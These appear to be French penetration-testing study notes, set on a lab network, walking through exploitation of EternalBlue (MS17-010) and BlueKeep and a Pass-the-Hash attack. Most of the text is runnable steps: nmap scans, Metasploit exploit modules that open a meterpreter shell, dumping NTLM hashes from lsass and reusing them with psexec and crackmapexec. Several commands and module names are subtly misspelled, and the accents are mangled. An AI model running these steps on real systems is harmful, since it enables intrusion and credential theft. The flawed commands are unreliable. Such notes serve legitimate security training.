
# Eternal Blue  
MS17-010/CVE-2017-0144 est une collection de vuln√©rabilit√©s windows et d'exploits qui permettent d'ex√©cuter du code arbitraire √† distance et d'avoir un contr√¥le d'acc√®s avec privil√®ges.  
L'exploit EternalBlue a √©t√© utilis√© dans l'attaque par le ransomewar WannaCry.  

**Machines vuln√©rables :**  
Win Vista
Win 7
Win Server 2008
Win 8.1
Win Server 2012
Win 10
Win Server 2016

On peut notamment exploiter le protocole SMBv1:  
Ex : `nmap -sV -p 445 -O 10.10.10.12` permet de scanner l'IP indiqu√©e sur le port 445 avec la version du service et l'OS.  
Pour savoir si la cible est vuln√©rable √† la MS17-010, on peut rajouter le script associ√© `--script=smb-vuln-ms17-01`

### Exploit avec Metasploit
`search eternalblue`. Puis pour lancer un exploit `exploit/windows/smb/ms17_010_eternalblue`, rentrer les options et si l'exploit fonctionne on obtient un meterpreter. `sysinfo` permet de valider que nous sommes bien sur le shell distant. et `getuid` permet de r√©cup√©rer l'utilisateur (en th√©orie "system" ici).  

---

# RDP  
BlueKeep (CVE-2019-0708)  

**Machines vuln√©rables :**  
* XP  
* Vista  
* Windows 7  
* Windows Server 2008 & R2  

`sudo nmap - 3389 10.10.10.7` pour voir si RDP tourne sur la machine.  
Si le service tourne on lance metasploit `msfconsole`.  
`search BlueKeep` pour chercher les modules d'exploit.  

le scanner permet de voir si la cible est vuln√©rable. Si oui, il reste lancer l'exploit module, "exploit/windows/rdp/cve_2019_078_bluekeep_rce"  
On param√®tre ensuite les infos de la cible,  
Et le "payload options" : c'est √† dire l'IP de notre machine et le port d'√©coute.  
Il est pr√©f√©rable d'indiquer la target avec `show target`, choisir la version, et lancer l'exploit.  
Si le meterpreter se lance, cel√† signifie que 'lon est conect√© √† la machine cible. On peut v√©rifier avec "sysinfo"  

Cet exploit permet l'ex√©cution de code √† distance avec des privil√®ges √©lev√©s.  

---

# Pass-The-Hash

>üí°D√©finition : Technique d'exploitation qui implique de capturer un hash NTLM ou >des passwords en clair et de les utiliser pour s'authentifier avec la cible de >mani√®re l√©gitime.  

### Metasploit PsExec module

* `search badblue`, `exploit/windows/http/badblue_passthru`. Lancer l'exploit.  
* Une fois le meterpreter lanc√© : `pgrep lsass` puis le r√©sultat de la commande doit √™tre utilis√© par `migrate XXX`. `getuid` devrait nous renvoyer "NT AUTORITY\SYSEM"  
* `load kiwi`, puis `lsa_dump_sam` pour obtenir les hash NTLM des users.  
* Une fois les HASH obtenus, nous avons besoin des LM HASH avec la commande `hashdump`
* retourner dans msfconsole, puis `search psexec`, `exploit/windows/smb/psexec`, renseigner IP cible, un port local avec "LPORT", "SMBUser" avec un des users trouv√©s, et "SMBPass" avec le LM HASH:NTLM HASH (s√©par√©s par ":")
* Lancer l'exploit
* Pour obtenir un meterpreter, il faut `set target`, `set target Native upload` par exemple, `run` et on devrait √™tre connect√© sur le shell de la cible.  
  

### Crackmapexec

`crackmapexec smb 10.10.10.12 -u Administator -H "<HASH NTLM>`.
-u : Avec le nom du user.  
-H : pour le Hash NTLM.  



